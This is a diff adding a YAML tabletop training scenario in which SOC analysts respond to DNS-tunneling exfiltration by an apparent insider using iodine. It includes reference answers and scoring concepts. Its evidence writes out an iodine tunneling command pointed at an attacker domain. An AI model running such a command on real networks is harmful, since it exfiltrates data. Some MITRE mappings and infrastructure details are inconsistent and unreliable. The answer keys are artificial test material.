@@ -1,0 +1,225 @@
+id: dns_tunneling_data_exfiltration
+name: DNS Tunneling Data Exfiltration
+category: Network
+format_version: 2
+difficulty: Hard
+soc_tier: L1
+roles:
+- analyst
+- incident_manager
+- ciso
+- executive
+industries:
+- all
+briefings:
+  analyst: You are the Tier-1 SOC analyst on shift. Your SIEM has fired an alert. Triage the scope, identify compromised assets, and take initial containment actions. Preserve evidence and escalate to the incident manager when the incident exceeds L1 scope.
+  incident_manager: You are the Incident Manager coordinating the response to DNS Tunneling Exfiltration via Iodine on Developer Workstation. Drive containment, evidence preservation, escalation, and cross-team communications; keep the war-room bridge aligned and document every major decision.
+  ciso: You are the CISO accountable for DNS Tunneling Exfiltration via Iodine on Developer Workstation. Weigh business impact, legal and regulatory notification duties, customer commitments, and the risk of disruptive containment.
+  executive: You are the executive sponsor for DNS Tunneling Exfiltration via Iodine on Developer Workstation. Focus on business continuity, budget and resource approval, customer and partner communications, and the timing of external disclosure.
+executive_brief: |-
+  Executive summary of the DNS Tunneling Exfiltration via Iodine on Developer Workstation incident. On 2025-12-03, the network security team noticed anomalous DNS query patterns from workstation dev-ws-047 (10.10.50.47, assigned to senior developer r.patel, AD: CORP\r.patel). Passive DNS monitoring (Zeek) logged 387,412 TXT and NULL record queries to the subdomain t.data.tunnelcorp.net over 72 hours (Nov 30 – Dec 3), averaging 5,380 queries/hour versus the normal 12 queries/hour for this host.
+
+  The queries encode base32-encoded data payloads in subdomain labels. Query volume analysis suggests approximately 1.7 GB of data was exfiltrated. The authoritative nameserver for tunnelcorp.net is hosted at NS1.Hetzner (185.199.108.153). Network flow data shows consistent UDP/53 outbound traffic of 48 KB/s sustained from dev-ws-047.
+
+  The developer r.patel reported the workstation 'feels sluggish' on Dec 2 but did not open a ticket. EDR (CrowdStrike Falcon) on dev-ws-047 shows iodine.exe (SHA256: f9e8d7c6b5a4...) running as a child process of explorer.exe, started via a scheduled task 'DevSyncHelper' created on Nov 29 at 23:14 UTC. The binary was staged from C:\Users\r.patel\Downloads\iodine-0.7.8-win32.zip. Business impact: network availability and traffic confidentiality are at risk, and perimeter and segmentation controls are under scrutiny. Immediate decisions: authorize containment that may interrupt service, preserve forensic evidence, and agree the external communication cadence with legal and communications. Regulatory exposure: counsel should assess contractual and regulatory notification duties if traffic or data was exposed.
+incident:
+  title: DNS Tunneling Exfiltration via Iodine on Developer Workstation
+  opening: 'On 2025-12-03, the network security team noticed anomalous DNS query patterns from workstation dev-ws-047 (10.10.50.47, assigned to senior developer r.patel, AD: CORP\r.patel). Passive DNS monitoring (Zeek) logged 387,412 TXT and NULL record queries to the subdomain t.data.tunnelcorp.net over 72 hours (Nov 30 – Dec 3), averaging 5,380 queries/hour versus the normal 12 queries/hour for this host.'
+  summary: |-
+    On 2025-12-03, the network security team noticed anomalous DNS query patterns from workstation dev-ws-047 (10.10.50.47, assigned to senior developer r.patel, AD: CORP\r.patel). Passive DNS monitoring (Zeek) logged 387,412 TXT and NULL record queries to the subdomain t.data.tunnelcorp.net over 72 hours (Nov 30 – Dec 3), averaging 5,380 queries/hour versus the normal 12 queries/hour for this host.
+
+    The queries encode base32-encoded data payloads in subdomain labels. Query volume analysis suggests approximately 1.7 GB of data was exfiltrated. The authoritative nameserver for tunnelcorp.net is hosted at NS1.Hetzner (185.199.108.153). Network flow data shows consistent UDP/53 outbound traffic of 48 KB/s sustained from dev-ws-047.
+
+    The developer r.patel reported the workstation 'feels sluggish' on Dec 2 but did not open a ticket. EDR (CrowdStrike Falcon) on dev-ws-047 shows iodine.exe (SHA256: f9e8d7c6b5a4...) running as a child process of explorer.exe, started via a scheduled task 'DevSyncHelper' created on Nov 29 at 23:14 UTC. The binary was staged from C:\Users\r.patel\Downloads\iodine-0.7.8-win32.zip.
+  compromised_assets:
+  - dev-ws-047 (10.10.50.47) — r.patel's workstation
+  - 'Active Directory: CORP\r.patel'
+  - Source code repository data (Git internals)
+  - DNS infrastructure (query volume impact)
+  detected_via: Passive DNS anomaly — TXT record query volume spike on Zeek
+  kill_chain:
+  - Initial Access
+  - Execution
+  - Persistence
+  - Collection
+  - Exfiltration
+  mitre_tactics:
+  - Initial Access
+  - Execution
+  - Persistence
+  - Collection
+  - Exfiltration
+phases:
+- id: dns_anomaly_detection
+  phase_type: triage
+  title: Phase 1 — DNS Anomaly Detection
+  situation: Zeek DNS logs show dev-ws-047 (10.10.50.47) has been sending TXT queries to t.data.tunnelcorp.net at 5,380/hour since Nov 30. Each query subdomain label is 40–55 characters of base32-encoded data. Your DNS sinkhole has not flagged this because tunnelcorp.net is not on any blocklist. The NS record for tunnelcorp.net points to 185.199.108.153 (Hetzner). You have never seen this domain in your environment before. The query pattern is clearly DNS tunneling.
+  prompt: What is your first response?
+  guidance:
+    what: 'Separate signal from noise: confirm the alert on dev-ws-047, its severity, and the affected accounts.'
+    action: What is your first response?
+    why: Rapid scoping decides everything downstream — triage is where containment starts.
+  hint: 'Start with the alert itself: which asset, account, and time window are actually in scope? Focus: Phase 1 — DNS Anomaly Detection. Asset in scope: dev-ws-047.'
+  hints:
+  - Consider pulling the relevant logs for the affected window.
+  - Think about which accounts or assets could be affected.
+  ideal_concepts:
+  - immediately block
+  - tunnelcorp net
+  - net dns
+  - dns resolver
+  - resolver pi-hole
+  - pi-hole infoblox
+  - infoblox add
+  - hetzner firewall
+  reference_answer: |-
+    Immediately block tunnelcorp.net at the DNS resolver (Pi-hole or Infoblox), add the Hetzner NS IP to the firewall blocklist, then isolate dev-ws-047 from the network for forensic analysis while preserving memory and disk evidence.
+
+    Why: Blocking at DNS stops ongoing exfiltration immediately. Isolating the host preserves volatile evidence (running iodine process, network connections) while preventing further data loss. This is the correct sequence: contain first, then investigate.
+  followup_good: dev-ws-047 is now isolated. Memory dump (Magnet RAM Capture) shows iodine.exe PID 4412 listening on UDP 127.0.0.1:53 with a tunnel interface configured as 10.0.0.2/32 (point-to-point to the remote nameserver). DNS cache on the host shows cached responses from t.data.tunnelcorp.net with encoded responses in CNAME and MX records. Scheduled task 'DevSyncHelper' is configured to run iodine.exe with arguments '-P correcthorse -Z -L t.data.tunnelcorp.net' every 4 hours. The password 'correcthorse' was found in a config file at C:\Users\r.patel\.iodine.conf. Process tree shows iodine spawned cmd.exe which ran a batch script C:\Users\r.patel\Scripts\sync.bat that used 7z to archive C:\Users\r.patel\Projects\repo-core\ before tunneling.
+  followup_weak: |-
+    Blocking at DNS stops ongoing exfiltration immediately.
+
+    dev-ws-047 is now isolated. Memory dump (Magnet RAM Capture) shows iodine.exe PID 4412 listening on UDP 127.0.0.1:53 with a tunnel interface configured as 10.0.0.2/32 (point-to-point to the remote nameserver). DNS cache on the host shows cached responses from t.data.tunnelcorp.net with encoded responses in CNAME and MX records. Scheduled task 'DevSyncHelper' is configured to run iodine.exe with arguments '-P correcthorse -Z -L t.data.tunnelcorp.net' every 4 hours. The password 'correcthorse' was found in a config file at C:\Users\r.patel\.iodine.conf. Process tree shows iodine spawned cmd.exe which ran a batch script C:\Users\r.patel\Scripts\sync.bat that used 7z to archive C:\Users\r.patel\Projects\repo-core\ before tunneling.
+  next: host_forensics_and_process_analysis
+  mitre_tactic: Exfiltration
+  mitre_technique: T1048.003 — Exfiltration Over Unencrypted Non-C2 Protocol
+- id: host_forensics_and_process_analysis
+  phase_type: analysis
+  title: Phase 2 — Host Forensics and Process Analysis
+  situation: dev-ws-047 is now isolated. Memory dump (Magnet RAM Capture) shows iodine.exe PID 4412 listening on UDP 127.0.0.1:53 with a tunnel interface configured as 10.0.0.2/32 (point-to-point to the remote nameserver). DNS cache on the host shows cached responses from t.data.tunnelcorp.net with encoded responses in CNAME and MX records. Scheduled task 'DevSyncHelper' is configured to run iodine.exe with arguments '-P correcthorse -Z -L t.data.tunnelcorp.net' every 4 hours. The password 'correcthorse' was found in a config file at C:\Users\r.patel\.iodine.conf. Process tree shows iodine spawned cmd.exe which ran a batch script C:\Users\r.patel\Scripts\sync.bat that used 7z to archive C:\Users\r.patel\Projects\repo-core\ before tunneling.
+  prompt: What is your forensic investigation priority?
+  guidance:
+    what: Test the initial theory against telemetry from dev-ws-047 before committing to a response.
+    action: What is your forensic investigation priority?
+    why: The quality of the recovery depends on how well the investigation proves what happened.
+  hint: 'Ask which evidence source would prove or disprove the attacker''s reach before you act on assumptions. Focus: Phase 2 — Host Forensics and Process Analysis. Asset in scope: dev-ws-047.'
+  hints:
+  - Cross-reference findings with identity and privilege context.
+  ideal_concepts:
+  - decode dns
+  - dns query
+  - query payloads
+  - payloads zeek
+  - zeek logs
+  - logs base32
+  - base32 decoding
+  - decoding reconstruct
+  reference_answer: |-
+    Decode DNS query payloads from Zeek logs using base32 decoding to reconstruct the exfiltrated archive. Cross-reference with r.patel's Git repository access logs to determine exactly which source code and secrets were in the repo-core directory. Check for any .env, .pem, or credential files in the archived content.
+
+    Why: Determining exactly what was exfiltrated is critical for breach assessment. Source code repositories often contain API keys, database credentials, and proprietary algorithms. Reconstructing the archive from DNS queries quantifies the data loss precisely.
+  followup_good: HR records show r.patel has been with the company for 4.2 years and recently received a negative performance review on Oct 15. r.patel's Git access logs show they cloned repo-core (containing the company's proprietary ML inference engine and 12 AWS access keys) on Nov 28, one day before the iodine scheduled task was created. Security camera logs show r.patel was the only person in the office on Nov 29 at 23:14 UTC when the task was created. The iodine binary was downloaded from a personal Dropbox account (not corporate OneDrive). r.patel's badge access logs show normal working hours with no after-hours access except Nov 29. The Hetzner nameserver was registered 5 days before the attack using a privacy-shielded WHOIS record.
+  followup_weak: |-
+    Determining exactly what was exfiltrated is critical for breach assessment.
+
+    HR records show r.patel has been with the company for 4.2 years and recently received a negative performance review on Oct 15. r.patel's Git access logs show they cloned repo-core (containing the company's proprietary ML inference engine and 12 AWS access keys) on Nov 28, one day before the iodine scheduled task was created. Security camera logs show r.patel was the only person in the office on Nov 29 at 23:14 UTC when the task was created. The iodine binary was downloaded from a personal Dropbox account (not corporate OneDrive). r.patel's badge access logs show normal working hours with no after-hours access except Nov 29. The Hetzner nameserver was registered 5 days before the attack using a privacy-shielded WHOIS record.
+  next: attribution_and_insider_threat_assessment
+  mitre_tactic: Collection
+  mitre_technique: T1560.002 — Archive Collected Data via Utility
+- id: attribution_and_insider_threat_assessment
+  phase_type: eradication
+  title: Phase 3 — Attribution and Insider Threat Assessment
+  situation: HR records show r.patel has been with the company for 4.2 years and recently received a negative performance review on Oct 15. r.patel's Git access logs show they cloned repo-core (containing the company's proprietary ML inference engine and 12 AWS access keys) on Nov 28, one day before the iodine scheduled task was created. Security camera logs show r.patel was the only person in the office on Nov 29 at 23:14 UTC when the task was created. The iodine binary was downloaded from a personal Dropbox account (not corporate OneDrive). r.patel's badge access logs show normal working hours with no after-hours access except Nov 29. The Hetzner nameserver was registered 5 days before the attack using a privacy-shielded WHOIS record.
+  prompt: How do you handle the insider threat dimension?
+  guidance:
+    what: Confirm the root cause and remove the artifacts that would let the attacker return.
+    action: How do you handle the insider threat dimension?
+    why: Credentials and entry paths must be removed, not just the malware that used them.
+  hint: 'Look beyond the visible payload for persistence, stolen credentials, and the original entry path. Focus: Phase 3 — Attribution and Insider Threat Assessment. Asset in scope: dev-ws-047.'
+  hints:
+  - Premature termination without proper investigation and legal counsel could result in wrongful termination claims and may compromise the ability to gather evidence.
+  - Rotate or reset any credentials the attacker may have touched.
+  ideal_concepts:
+  - coordinate legal
+  - legal initiate
+  - initiate employee
+  - employee interview
+  - interview patel
+  - patel counsel
+  - counsel supervision
+  - supervision simultaneously
+  reference_answer: |-
+    Coordinate with HR and Legal to initiate an employee interview with r.patel under counsel supervision. Simultaneously rotate all 12 AWS access keys found in repo-core, audit all of r.patel's code repository access across the last 90 days, and engage a forensic accounting firm to trace any financial connections between r.patel and the tunnelcorp.net infrastructure.
+
+    Why: The combination of negative performance review, after-hours activity, personal Dropbox staging, and privacy-shielded WHOIS strongly suggests insider involvement. HR and legal must lead the employee interaction to protect the company. Credential rotation is urgent because AWS keys were confirmed exfiltrated. Forensic accounting helps establish motive and scope.
+  followup_good: Post-incident, you need to prevent DNS tunneling from recurring. Your current DNS infrastructure uses Pi-hole for ad blocking (10.10.1.25) and Microsoft DNS on DC-01 for internal resolution. External queries go through Cloudflare DoH (1.1.1.1). There are no DNS query logging policies, no DNS response size limits, and no analytics on query frequency per host. The CISO wants a comprehensive DNS security architecture. Budget is available for commercial DNS security tooling.
+  followup_weak: |-
+    The combination of negative performance review, after-hours activity, personal Dropbox staging, and privacy-shielded WHOIS strongly suggests insider involvement.
+
+    Post-incident, you need to prevent DNS tunneling from recurring. Your current DNS infrastructure uses Pi-hole for ad blocking (10.10.1.25) and Microsoft DNS on DC-01 for internal resolution. External queries go through Cloudflare DoH (1.1.1.1). There are no DNS query logging policies, no DNS response size limits, and no analytics on query frequency per host. The CISO wants a comprehensive DNS security architecture. Budget is available for commercial DNS security tooling.
+  next: recovery_and_validation
+  mitre_tactic: Defense Evasion
+  mitre_technique: T1027 — Obfuscated Files or Information
+- id: recovery_and_validation
+  phase_type: recovery
+  title: Recovery & Validation
+  situation: Containment is holding and the attacker's active access has been removed. dev-ws-047 is quarantined or offline, and business owners are asking when service can resume. Backups, rebuild images, and a change window are available — but the root cause must be proven fixed first.
+  prompt: What must be true before you return dev-ws-047 to production?
+  guidance:
+    what: Decide how to restore service in stages while proving the environment is free of reinfection.
+    action: What must be true before you return dev-ws-047 to production?
+    why: Business trust depends on returning service with evidence that the environment is safe.
+  hint: 'Trusted backups and proof of cleanliness come before speed; a fast restore can reopen the incident. Focus: Recovery & Validation. Asset in scope: dev-ws-047.'
+  hints:
+  - Which backup or rebuild image is known-good for dev-ws-047, and when was it validated?
+  - Which credentials or certificates were exposed and must be rotated before restore?
+  - What monitoring will prove the attacker has not returned after service resumes?
+  ideal_concepts:
+  - known-good backup
+  - integrity validation
+  - credential rotation
+  - reinfection monitoring
+  - staged restoration
+  - business sign-off
+  reference_answer: |-
+    Restore dev-ws-047 from a known-good backup or rebuild it from a trusted image, validate system and data integrity, rotate every credential and certificate exposed during the incident, and monitor the restored environment for reinfection before handing it back to the business.
+
+    Why: Recovery is only complete when the root cause is fixed and the restored asset is proven clean; restoring compromised infrastructure reopens the incident.
+  followup_good: Services are restored in stages from trusted sources, exposed credentials are rotated, and monitoring confirms no reinfection. The business signs off on the restored service with evidence attached.
+  followup_weak: The asset is back online, but the root cause and credential exposure were not fully validated. The attacker still has a path back in, and the incident may reopen under a new alert.
+  next: infrastructure_hardening_and_dns_policy
+  next_weak: ''
+  mitre_tactic: Collection
+  mitre_technique: T1048.003 — Exfiltration Over DNS
+  role_prompts: {}
+- id: infrastructure_hardening_and_dns_policy
+  phase_type: lessons
+  title: Phase 4 — Infrastructure Hardening and DNS Policy
+  situation: Post-incident, you need to prevent DNS tunneling from recurring. Your current DNS infrastructure uses Pi-hole for ad blocking (10.10.1.25) and Microsoft DNS on DC-01 for internal resolution. External queries go through Cloudflare DoH (1.1.1.1). There are no DNS query logging policies, no DNS response size limits, and no analytics on query frequency per host. The CISO wants a comprehensive DNS security architecture. Budget is available for commercial DNS security tooling.
+  prompt: What DNS security improvements do you recommend?
+  guidance:
+    what: Summarize what happened, what was missed, and which controls failed on dev-ws-047.
+    action: What DNS security improvements do you recommend?
+    why: The post-incident review is what turns an incident into a defense.
+  hint: 'Turn this incident into one detection improvement and one preventive control that outlast the report. Focus: Phase 4 — Infrastructure Hardening and DNS Policy. Asset in scope: dev-ws-047.'
+  hints:
+  - Basic query logging without analytics generates noise without actionable detection capability.
+  - Blocking all external DNS breaks legitimate services and does not prevent tunneling through the internal resolver.
+  ideal_concepts:
+  - deploy dns
+  - dns security
+  - security platform
+  - platform cisco
+  - cisco umbrella
+  - umbrella infoblox
+  - infoblox bloxone
+  - bloxone real-time
+  reference_answer: |-
+    Deploy a DNS security platform (Cisco Umbrella or Infoblox BloxOne) with: (1) real-time DNS analytics for query volume per host, (2) DGA/tunneling detection algorithms, (3) block all DoH/DoT except approved resolvers, (4) enforce DNS query logging with 90-day retention, (5) add DNS response size threshold alerts (>512 bytes for TXT records), (6) implement DNS firewall rules blocking known bulletproof hosting NS IPs.
+
+    Why: A comprehensive DNS security platform provides both detection and prevention. Blocking unauthorized DoH/DoT prevents attackers from bypassing monitoring. Query volume analytics would have detected this attack hours earlier. Response size thresholds catch the large encoded payloads used in tunneling.
+  followup_good: |-
+    The scenario ends here.
+
+    Executive summary of the DNS Tunneling Exfiltration via Iodine on Developer Workstation incident. On 2025-12-03, the network security team noticed anomalous DNS query patterns from workstation dev-ws-047 (10.10.50.47, assigned to senior developer r.patel, AD: CORP\r.patel). Passive DNS monitoring (Zeek) logged 387,412 TXT and NULL record queries to the subdomain t.data.tunnelcorp.net over 72 hours (Nov 30 – Dec 3), averaging 5,380 queries/hour versus the normal 12 queries/hour for this host.
+
+    The queries encode base32-encoded data payloads in subdomain labels. Query volume analysis suggests ...
+  followup_weak: |-
+    The scenario ends here.
+
+    Executive summary of the DNS Tunneling Exfiltration via Iodine on Developer Workstation incident. On 2025-12-03, the network security team noticed anomalous DNS query patterns from workstation dev-ws-047 (10.10.50.47, assigned to senior developer r.patel, AD: CORP\r.patel). Passive DNS monitoring (Zeek) logged 387,412 TXT and NULL record queries to the subdomain t.data.tunnelcorp.net over 72 hours (Nov 30 – Dec 3), averaging 5,380 queries/hour versus the normal 12 queries/hour for this host.
+
+    The queries encode base32-encoded data payloads in subdomain labels. Query volume analysis suggests ...
+  mitre_tactic: Collection
+  mitre_technique: T1048.003 — Exfiltration Over DNS
